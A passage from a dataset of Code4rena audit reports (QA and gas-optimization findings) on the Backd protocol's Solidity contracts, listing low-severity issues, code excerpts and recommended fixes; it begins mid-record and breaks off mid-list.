[test_registration.py:283](\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/tests/top_up_action/test_registration.py#L283)\n\nI would suggest changing the following\n\n```sol\n     * @dev The `depositAmount` must be greater or equal to the `totalTopUpAmount` (which is denominated in `actionToken`).\n```     \n\nto this\n\n```sol\n     * @dev The `depositAmount`, once converted to units of `actionToken`, must be greater or equal to the `totalTopUpAmount` (which is denominated in `actionToken`).\n```\n\n## Non-critical: `execute` pays fees in action token by swapping funds denominated in position token\n\nTop-up amounts are denominated in the token of the position (which is not always the action token). While this makes complete sense, the design to pay the top-up fees by swapping the position token for action token seems strange. Why not choose a design where users of the `TopUpAction` contract deposit both the position token and, separately, action token for the fees?\n\nWith the present design you must swap the token for Action Token to pay the fees to the Keeper which introduces issues with slippage. The swap to Action Token can fail if there as been too much slippage.\n\n# Typographical errors\n\n- [AaveHandler.sol:32](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/AaveHandler.sol#L32) \"tup-up\" -> \"top-up\"\n",
    "dataSource": {
      "name": "code-423n4/2022-04-backd-findings",
      "repo": "https://github.com/code-423n4/2022-04-backd-findings",
      "url": "https://github.com/code-423n4/2022-04-backd-findings/issues/209"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "2022-04-backd optimization\n\n## 1 use calldata instead of memory. \n\nThe following input for function can be calldata instead of memory to save gas.\n\nhttps://github.com/code-423n4/2022-04-backd/blob/main/backd/contracts/pool/Erc20Pool.sol#L15\nhttps://github.com/code-423n4/2022-04-backd/blob/main/backd/contracts/pool/EthPool.sol#L13\nhttps://github.com/code-423n4/2022-04-backd/blob/main/backd/contracts/pool/LiquidityPool.sol#L702\nhttps://github.com/code-423n4/2022-04-backd/blob/main/backd/interfaces/pool/IEthPool.sol#L6\nhttps://github.com/code-423n4/2022-04-backd/blob/main/backd/interfaces/pool/IErc20Pool.sol#L6\n\nstring calldata name_,\n\n\n## 2 check the following validation at the beginning of updateDepositCap.\n\nThe other require statements need to read the state variable. So you can save gas if the input _depositCap is 0 and the execution is reverted.\n\nhttps://github.com/code-423n4/2022-04-backd/blob/main/backd/contracts/pool/LiquidityPool.sol#L401\n\nPlace the require statement at the beginning of updateDepositCap.\n\n\n## 3 use unchecked for the following calculation.\n\nThe underflow must happen never because the calculation tries to subtract after balance from before balance.\n\nhttps://github.com/code-423n4/2022-04-backd/blob/main/backd/contracts/StakerVault.sol#L384\n\nuint256 unstaked;\nunchecked {\n    unstaked = oldBal - IERC20(token).balanceOf(address(this));\n} \n\n## 4 delete the following local variables that are used only one time in transferFrom.\n\nThe local variables allowanceNew, srcTokensNew, and dstTokensNew are used only one time in transferFrom, so you can delete them and set these calculations directly for state variables.  \n\nhttps://github.com/code-423n4/2022-04-backd/blob/main/backd/contracts/StakerVault.sol#L163-L165\n\nbalances[src] = srcTokens - amount;\nbalances[dst] = balances[dst] + amount;\n\nif (startingAllowance != type(uint256).max) {\n    _allowances[src][spender] = startingAllowance - amount;\n}\n\n## 5 use unchecked for the calculation in decreaseActionLockedBalance.\n\nThe underflow is checked already in if sentence, so you can use unchecked to save gas costs.\n\nhttps://github.com/code-423n4/2022-04-backd/blob/main/backd/contracts/StakerVault.sol#L231\n\nunchecked {\n    actionLockedBalances[account] -= amount;\n}\n\n## 6 use the initial value, prefix and unchecked in loop\n\nhttps://github.com/code-423n4/2022-04-backd/blob/main/backd/contracts/StakerVault.sol#L260\nhttps://github.com/code-423n4/2022-04-backd/blob/main/backd/contracts/BkdLocker.sol#L310\n\nfor (uint256 i; i < length;) {\n    // do something\n    unchecked {\n        ++i;\n    }\n}\n\n## 7 use unchecked for the calculation in _withdrawFrom. \n\nThe underflow for the following calculation is already checked in the next lines, so you can use unchecked to save gas costs.\n\nhttps://github.com/code-423n4/2022-04-backd/blob/main/backd/contracts/GasBank.sol#L87\n\nhttps://github.com/code-423n4/2022-04-backd/blob/main/backd/contracts/GasBank.sol#L68\nhttps://github.com/code-423n4/2022-04-backd/blob/main/backd/contracts/GasBank.sol#L76\n\nIn withdrawUnused the underflow is also checked because the unused amount will be transferred.\n\nunchecked {\n    _balances[account] = currentBalance - amount;\n}  \n",
    "dataSource": {
      "name": "code-423n4/2022-04-backd-findings",
      "repo": "https://github.com/code-423n4/2022-04-backd-findings",
      "url": "https://github.com/code-423n4/2022-04-backd-findings/issues/204"
    }
  },
  {
    "title": "QA Report",
    "body": "## Low\n\n### Missing freshness validation in ETH price oracle\n\nThe `ChainlinkUsdWrapper#_ethPrice()` function does not check for a nonzero answer or validate that the price was returned in a recent round:\n\n[`ChainlinkUsdWrapper#_ethPrice`](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/oracles/ChainlinkUsdWrapper.sol#L63-L66)\n\n```solidity\n    function _ethPrice() private view returns (int256) {\n        (, int256 answer, , , ) = _ethOracle.latestRoundData();\n        return answer;\n    }\n```\n\nAlthough callers of `ChainlinkUsd#latestRoundData` can check for a nonzero price, they can't verify that the ETH oracle price used in this conversion was returned in a recent round. If the ETH oracle returns a stale price, the wrapper may return an inaccurate conversion.\n\nRecommendation: Validate returned ETH price using `roundId` and `answeredInRound`.\n\n### Avoid `payable.transfer`\n\n`EthPool` and `EthVault` both use `payable(address).transfer` to transfer ETH.\n\nIt's considered a best practice to avoid this pattern for ETH transfers, since it forwards a fixed amount of gas and may revert if future gas costs change. (See the Consensys Diligence article [here](https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/)).\n\n[`EthPool#_doTransferOut`](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/EthPool.sol#L29-L31)\n\n```solidity\n    function _doTransferOut(address payable to, uint256 amount) internal override {\n        to.transfer(amount);\n    }\n```\n\n[`EthVault#_transfer`](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/EthVault.sol#L28-L30)\n\n```solidity\n    function _transfer(address to, uint256 amount) internal override {\n        payable(to).transfer(amount);\n    }\n```\n\n[`EthVault#_depositToTreasury`](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/EthVault.sol#L36-L38)\n\n```solidity\n    function _depositToTreasury(uint256 amount) internal override {\n        payable(addressProvider.getTreasury()).transfer(amount);\n    }\n```\n\nConsider using OpenZeppelin [`Address.sendValue`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/fcf35e5722847f5eadaaee052968a8a54d03622a/contracts/utils/Address.sol#L60), but take care to avoid reentrancy. Callers of these internal functions should be protected with a reentrancy guard.\n\n## QA/Noncritical\n\n### Gas bank depositors can deposit for zero address\n\nDepositors to the `GasBank` can accidentally make a deposit on behalf of `address(0)`:\n\n[`GasBank#depositFor`](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/GasBank.sol#L22-L28)\n\n```solidity\n    /**\n     * @notice Deposit `msg.value` on behalf of `account`\n     */\n    function depositFor(address account) external payable override {\n        _balances[account] += msg.value;\n        emit Deposit(account, msg.value);\n    }\n```\n\nSince withdrawals check that `msg.sender` matches the given withdrawal account, deposits credited to `address(0)` cannot be recovered. Consider checking that the deposit account is not `address(0)`.\n\n### Mismatched error message in `StakerVault#transferFrom`\n\nThe error message on line 152 of `StakerVault.sol` checks the user's allowance, but returns an \"insufficient balance\" error message:\n\n[`StakerVault#transferFrom`](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/StakerVault.sol#L145-L152)\n\n```solidity\n        /* Get the allowance, infinite for the account owner */\n        uint256 startingAllowance = 0;\n        if (spender == src) {\n            startingAllowance = type(uint256).max;\n        } else {\n            startingAllowance = _allowances[src][spender];\n        }\n        require(startingAllowance >= amount, Error.INSUFFICIENT_BALANCE); // Should this be 'insufficient allowance?'\n```\n\nAlthough this contract is explicitly not an ERC20 token, consider an \"insufficient allowance\" error, which is more consistent with user expectations.\n\n### Shadowed variable in initializer\n\nThe `roleManager` local variable shadows `AuthorizationBase.roleManager()` in `initialize`.\n\n[`AddressProvider#initialize`](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/AddressProvider.sol#L53-L57)\n\n```solidity\n    function initialize(address roleManager) external initializer {\n        AddressProviderMeta.Meta memory meta = AddressProviderMeta.Meta(true, true);\n        _addressKeyMetas.set(AddressProviderKeys._ROLE_MANAGER_KEY, meta.toUInt());\n        _setConfig(AddressProviderKeys._ROLE_MANAGER_KEY, roleManager);\n    }\n```\n\n### Shadowed variable in constructor\n\nThe `roleManager` local variable shadows `AuthorizationBase.roleManager()` in `Authorization#constructor`.\n\n[`Authorization#constructor`](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/access/Authorization.sol#L9-L11)\n\n```solidity\n    constructor(IRoleManager roleManager) {\n        __roleManager = roleManager; // shadowed variable in constructor\n    }\n```\n\n### Unnecessary ternary\n\n[`SwapperRegistry#swapperExists`](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/SwapperRegistry.sol#L70-L83) uses an unnecessary ternary operator:\n\n```solidity\n    /**\n     * @notice Check if a swapper implementation exists for a given token pair.\n     * @param fromToken Address of token to swap.\n     * @param toToken Address of token to receive.\n     * @return True if a swapper exists for the token pair.\n     */\n    function swapperExists(address fromToken, address toToken)\n        external\n        view\n        override\n        returns (bool)\n    {\n        return _swapperImplementations[fromToken][toToken] != address(0) ? true : false;\n    }\n```\n\n### Unused interface\n\n`BkdLocker.govToken` is instantiated as an `IBkdToken` but stored as an `IERC20`.\n\n[`BkdLocker#constructor`](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/BkdLocker.sol#L41-L50)\n\n```solidity\n    IERC20 public immutable govToken;\n\n    constructor(\n        address _rewardToken,\n        address _govToken,\n        IRoleManager roleManager\n    ) Authorization(roleManager) {\n        rewardToken = _rewardToken;\n        govToken = IBkdToken(_govToken);\n    }\n```\n\n### Missing natspec docs\n\nFunctions missing natspec documentation:\n- [`SwapperRegistry#getAllSwappableTokens`](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/SwapperRegistry.sol#L86)\n\n### Additional events\n\nConsider adding events for:\n\n- [`CvxCrvRewardsLocker#setDelegate`](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/CvxCrvRewardsLocker.sol#L191)\n- [`CvxCrvRewardsLocker#clearDelegate`](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/CvxCrvRewardsLocker.sol#L199)\n\n### Duplicate import\n\n`Errors.sol` and `IController.sol` imports are duplicated in `StakerVault.sol`.\n\n- [`StakerVault.sol#L10`](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/StakerVault.sol#L10)\n- [`StakerVault.sol#L18`](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/StakerVault.sol#L18)",
    "dataSource": {
      "name": "code-423n4/2022-04-backd-findings",
      "repo": "https://github.com/code-423n4/2022-04-backd-findings",
      "url": "https://github.com/code-423n4/2022-04-backd-findings/issues/199"
    }
  },
  {
    "title": "QA Report",
    "body": "# C4-001 :Use safeTransfer/safeTransferFrom consistently instead of transfer/transferFrom\n\n## Impact -  LOW\n\n## Impact\n\nIt is good to add a require() statement that checks the return value of token transfers or to use something like OpenZeppelin’s safeTransfer/safeTransferFrom unless one is sure the given token reverts in case of a failure. Failure to do so will cause silent failures of transfers and affect token accounting in contract.\n\nReference: This similar medium-severity finding from Consensys Diligence Audit of Fei Protocol: https://consensys.net/diligence/audits/2021/01/fei-protocol/#unchecked-return-value-for-iweth-transfer-call\n\n\n## Proof of Concept\n\n1. Navigate to the following contract.\n\n2. transfer/transferFrom functions are used instead of safe transfer/transferFrom on the following contracts.\n\n```\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::62 => stakerVault.transferFrom(payer, address(this), amountLeft);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::291 => staker.transfer(payer, position.depositTokenBalance);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::692 => IStakerVault(vault).transfer(payer, position.depositTokenBalance);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CompoundHandler.sol::79 => bool success = ctoken.transfer(addr, mintedTokens);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/EthPool.sol::30 => to.transfer(amount);\n\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nConsider using safeTransfer/safeTransferFrom or require() consistently.\n\n\n# C4-002 : Use of Block.timestamp\n\n## Impact -  Non-Critical\n\nBlock timestamps have historically been used for a variety of applications, such as entropy for random numbers (see the Entropy Illusion for further details), locking funds for periods of time, and various state-changing conditional statements that are time-dependent. Miners have the ability to adjust timestamps slightly, which can prove to be dangerous if block timestamps are used incorrectly in smart contracts.\n\n\n## Proof of Concept\n\n1. Navigate to the following contract.\n\n```\n2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/oracles/ChainlinkOracleProvider.sol:57:        require(block.timestamp <= updatedAt + stalePriceDelay, Error.STALE_PRICE);\n2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/VaultReserve.sol:78:        _lastWithdrawal[msg.sender] = block.timestamp;\n2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/VaultReserve.sol:103:        return block.timestamp >= _lastWithdrawal[vault] + minWithdrawalDelay;\n2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/swappers/Swapper3Crv.sol:110:                block.timestamp\n\n```\n\n## Tools Used\n\nManual Code Review\n\n## Recommended Mitigation Steps\n\nBlock timestamps should not be used for entropy or generating random numbers—i.e., they should not be the deciding factor (either directly or through some derivation) for winning a game or changing an important state.\n\nTime-sensitive logic is sometimes required; e.g., for unlocking contracts (time-locking), completing an ICO after a few weeks, or enforcing expiry dates. It is sometimes recommended to use block.number and an average block time to estimate times; with a 10 second block time, 1 week equates to approximately, 60480 blocks. Thus, specifying a block number at which to change a contract state can be more secure, as miners are unable to easily manipulate the block number.\n\n\n# C4-003 : Missing events for only functions that change critical parameters\n\n## Impact - Non critical\n\nThe afunctions that change critical parameters should emit events. Events allow capturing the changed parameters so that off-chain tools/interfaces can register such changes with timelocks that allow users to evaluate them and consider if they would like to engage/exit based on how they perceive the changes as affecting the trustworthiness of the protocol or profitability of the implemented financial services. The alternative of directly querying on-chain contract state for such changes is not considered practical for most users/usages.\n\nMissing events and timelocks do not promote transparency and if such changes immediately affect users’ perception of fairness or trustworthiness, they could exit the protocol causing a reduction in liquidity which could negatively impact protocol TVL and reputation.\n\n\n## Proof of Concept\n\n1. Navigate to the following contract.\n\n```\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/Controller.sol#L31\n```\n\nSee similar High-severity H03 finding OpenZeppelin’s Audit of Audius (https://blog.openzeppelin.com/audius-contracts-audit/#high) and Medium-severity M01 finding OpenZeppelin’s Audit of UMA Phase 4 (https://blog.openzeppelin.com/uma-audit-phase-4/)\n\n## Tools Used\n\nNone\n\n## Recommended Mitigation Steps\n\nAdd events to all functions that change critical parameters.\n\n# C4-004 : # DoS With Block Gas Limit\n\n## Impact -  Non-Critical\n\nWhen smart contracts are deployed or functions inside them are called, the execution of these actions always requires a certain amount of gas, based of how much computation is needed to complete them. The Ethereum network specifies a block gas limit and the sum of all transactions included in a block can not exceed the threshold.\n\nProgramming patterns that are harmless in centralized applications can lead to Denial of Service conditions in smart contracts when the cost of executing a function exceeds the block gas limit. Modifying an array of unknown size, that increases in size over time, can lead to such a Denial of Service condition.\n\n## Proof of Concept\n\n1. Follow the functions shown below.\n\n```\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::185 => require(protocols.length == handlers.length, Error.INVALID_ARGUMENT);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::188 => for (uint256 i = 0; i < protocols.length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::455 => uint256 length = userRecordsMeta.length;\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::456 => for (uint256 i = 0; i < length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::477 => uint256 length = _supportedProtocols.length();\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::478 => bytes32[] memory protocols = new bytes32[](length);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::479 => for (uint256 i = 0; i < length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::499 => uint256 length = _usersWithPositions.length();\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::500 => if (cursor >= length) return (new address[](0), 0);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::501 => if (howMany >= length - cursor) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::502 => howMany = length - cursor;\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::878 => if (_userPositions[payer].length == 0) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::890 => uint256 length = positionsMeta.length;\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::891 => for (uint256 i = 0; i < length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::894 => positionsMeta[i] = positionsMeta[length - 1];\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol::42 => if (users.length == 0) return (_shortenTopups(executableTopups, topupsAdded), 0);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol::43 => for (uint256 i = 0; i < users.length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol::46 => for (uint256 j = 0; j < positions.length; j++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol::51 => uint256 offset = j == positions.length - 1 ? 1 : 0;\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol::71 => bool[] memory results = new bool[](keys.length);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol::72 => for (uint256 i = 0; i < keys.length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol::91 => uint256 length = userRecordsMeta.length;\n\n\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nCaution is advised when you expect to have large arrays that grow over time. Actions that require looping across the entire data structure should be avoided.\n\nIf you absolutely must loop over an array of unknown size, then you should plan for it to potentially take multiple blocks, and therefore require multiple transactions.\n\n\n# C4-005 : Critical changes should use two-step procedure\n\n## Impact - NON CRITICAL\n\nThe critical procedures should be two step process.\n\n## Proof of Concept\n\n1. Navigate to the following contract.\n\n```\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/access/RoleManager.sol#L149\n\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/access/RoleManager.sol#L155\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nLack of two-step procedure for critical operations leaves them error-prone. Consider adding two step procedure on the critical functions.\n\n\n# C4-006 : Front-runnable Initializers\n\n## Impact - LOW\n\nAll contract **initializers** were missing access controls, allowing any user to initialize the contract. By front-running the contract deployers to initialize the contract, the incorrect parameters may be supplied, leaving the contract needing to be redeployed.\n\n\n## Proof of Concept\n\n1. Navigate to the following contracts.\n\n```\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Erc20Vault.sol#L12\n```\n\n2. initialize functions does not have access control. They are vulnerable to front-running.\n\n## Tools Used\n\nManual Code Review\n\n## Recommended Mitigation Steps\n\nWhile the code that can be run in contract constructors is limited, setting the owner in the contract's constructor to the `msg.sender` and adding the `onlyOwner` modifier to all **initializers** would be a sufficient level of access control.\n\n\n# C4-007 : Incompatibility With Rebasing/Deflationary/Inflationary tokens\n\n## Impact -  LOW\n\nPrePo protocol do not appear to support rebasing/deflationary/inflationary tokens whose balance changes during transfers or over time. The necessary checks include at least verifying the amount of tokens transferred to contracts before and after the actual transfer to infer any fees/interest.\n\n## Proof of Concept\n\n1. Navigate to the following contract.\n\n```\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L523\n```\n\n## Tools Used\n\nManual Code Review\n\n## Recommended Mitigation Steps\n\n- Ensure that to check previous balance/after balance  equals to amount for any rebasing/inflation/deflation\n- Add support in contracts for such tokens before accepting user-supplied tokens\n- Consider supporting deflationary / rebasing / etc tokens by extra checking the balances before/after or strictly inform your users not to use such tokens if they don't want to lose them.\n\n# C4-008 : # Pragma Version\n\n## Impact\n\nIn the contracts, floating pragmas should not be used. Contracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, an outdated compiler version that might introduce bugs that affect the contract system negatively.\n\n## ## Proof of Concept\n\nhttps://swcregistry.io/docs/SWC-103\n\n```\nAll Contracts\n```\n\n## Tools Used\nManual code review\n\n## Recommended Mitigation Steps\nLock the pragma version: delete pragma solidity 0.8.10 in favor of pragma solidity 0.8.10\n\n\n# C4-009 : # Missing zero-address check in the setter functions and initiliazers\n\n## Impact\n\nMissing checks for zero-addresses may lead to infunctional protocol, if the variable addresses are updated incorrectly.\n\n## Proof of Concept\n\n1. Navigate to the following contracts.\n\n```\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/oracles/ChainlinkUsdWrapper.sol#L32\n\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/AaveHandler.sol#L24\n\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CompoundHandler.sol#L38\n\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdEthCvx.sol#L18\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nConsider adding zero-address checks in the discussed constructors:\nrequire(newAddr != address(0));.\n\n\n# C4-010 : # Lack of setter function for the oracle\n\n## Impact\n\nOn the UniswapV2PathPriceOracle contract, there is not setter function on the oracles addresses. This can cause misfunctionality on the uniswap oracle contract.\n\n## Proof of Concept\n\n1. Navigate to \"https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/oracles/ChainlinkUsdWrapper.sol#L32\" contract.\n2. Oracle addresses are set on the constructor.\n3. Setter function is missing on the contract. Misdeployed contract can cause failure of oracle integration.\n\n## Tools Used\n\nNone\n\n## Recommended Mitigation Steps\n\nConsider to add setter function for oracles addresses.\n\n\n# C4-0011 : The Contract Should approve(0) first\n\n## Impact  - LOW\n\nSome tokens (like USDT L199) do not work when changing the allowance from an existing non-zero allowance value.\nThey must first be approved by zero and then the actual allowance must be approved.\n\n```\nIERC20(token).safeApprove(address(operator), 0);\nIERC20(token).safeApprove(address(operator), amount);\n```\n\n## Proof of Concept\n\n1. Navigate to the following contracts.\n\n```\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/CvxCrvRewardsLocker.sol::53 => IERC20(CRV).safeApprove(CRV_DEPOSITOR, type(uint256).max);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/CvxCrvRewardsLocker.sol::56 => IERC20(CVX_CRV).safeApprove(CVX_CRV_STAKING, type(uint256).max);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/CvxCrvRewardsLocker.sol::59 => IERC20(CRV).safeApprove(CVX_CRV_CRV_CURVE_POOL, type(uint256).max);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/CvxCrvRewardsLocker.sol::62 => IERC20(CVX).safeApprove(CVX_LOCKER, type(uint256).max);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::50 => IERC20(token).safeApprove(stakerVaultAddress, depositAmount);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::847 => IERC20(depositToken).safeApprove(feeHandler, feeAmount);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::908 => IERC20(token).safeApprove(spender, type(uint256).max);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/AaveHandler.sol::53 => IERC20(underlying).safeApprove(address(lendingPool), amount);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CompoundHandler.sol::71 => IERC20(underlying).safeApprove(address(ctoken), amount);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CompoundHandler.sol::120 => IERC20(underlying).safeApprove(address(ctoken), debt);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol::721 => IERC20(lpToken_).safeApprove(staker_, type(uint256).max);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdEthCvx.sol::43 => IERC20(lp_).safeApprove(address(_BOOSTER), type(uint256).max);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol::71 => IERC20(underlying_).safeApprove(curveHopPool_, type(uint256).max);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol::72 => IERC20(hopLp_).safeApprove(curvePool_, type(uint256).max);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol::73 => IERC20(lp_).safeApprove(address(_BOOSTER), type(uint256).max);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol::129 => IERC20(hopLp).safeApprove(curvePool_, 0);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol::130 => IERC20(hopLp).safeApprove(curvePool_, type(uint256).max);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol::131 => IERC20(lp_).safeApprove(address(_BOOSTER), 0);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol::132 => IERC20(lp_).safeApprove(address(_BOOSTER), type(uint256).max);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol::107 => _CRV.safeApprove(address(_strategySwapper), type(uint256).max);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol::108 => _CVX.safeApprove(address(_strategySwapper), type(uint256).max);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol::109 => _WETH.safeApprove(address(_strategySwapper), type(uint256).max);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol::279 => IERC20(token_).safeApprove(address(_strategySwapper), 0);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol::280 => IERC20(token_).safeApprove(address(_strategySwapper), type(uint256).max);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/StrategySwapper.sol::209 => IERC20(token_).safeApprove(spender_, type(uint256).max);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/swappers/Swapper3Crv.sol::43 => IERC20(DAI).safeApprove(SUSHISWAP, type(uint256).max);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/swappers/Swapper3Crv.sol::44 => 